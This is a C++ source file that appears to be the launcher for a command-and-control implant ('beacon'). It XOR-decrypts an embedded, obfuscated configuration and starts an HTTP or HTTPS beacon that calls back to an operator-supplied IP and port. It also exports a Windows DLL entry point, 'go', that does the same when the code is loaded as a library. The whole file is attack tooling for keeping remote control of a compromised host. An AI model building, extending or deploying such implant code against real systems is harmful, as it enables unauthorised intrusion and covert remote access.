#include "BeaconHttp.hpp"

#include "cryptDef.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string ip = "...";
	if(argc > 1)
		ip = argv[1];

	int port = 8443;
	if (argc > 2)
		port = atoi(argv[2]);

	bool https = false;
	if (argc > 3)
	{
		std::string sHttps = argv[3];
		if(sHttps=="https")
			https=true;
		else if(sHttps=="http")
			https=false;
	}

    std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
    std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
    XOR(configDecrypt, keyConfig);

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconHttp>(configDecrypt, ip, port, https);

	beacon->run();
}


#ifdef __linux__
#elif _WIN32

extern "C" __declspec(dllexport) int go(PCHAR argv)
{
    // OutputDebugStringA("HelperFunc was executed");
    // OutputDebugStringA(argv);

    std::vector<std::string> splitedCmd;
    std::string delimiter = " ";
    splitList(argv, delimiter, splitedCmd);

    // OutputDebugStringA(splitedCmd[0].c_str());
    // OutputDebugStringA(splitedCmd[1].c_str());
    // OutputDebugStringA(splitedCmd[2].c_str());

    if (splitedCmd.size() == 3)
    {
        std::string ip = splitedCmd[0];
        int port = -1;
        try
        {
            port = stoi(splitedCmd[1]);
        }
        catch (...)
        {
            return 1;
        }

        bool https = true;
		std::string sHttps = splitedCmd[2];
		if(sHttps=="https")
			https=true;

        std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
        std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
        XOR(configDecrypt, keyConfig);

		std::unique_ptr<Beacon> beacon;
		beacon = make_unique<BeaconHttp>(configDecrypt, ip, port, https);

		beacon->run();
	}

    return 0;
}

#endif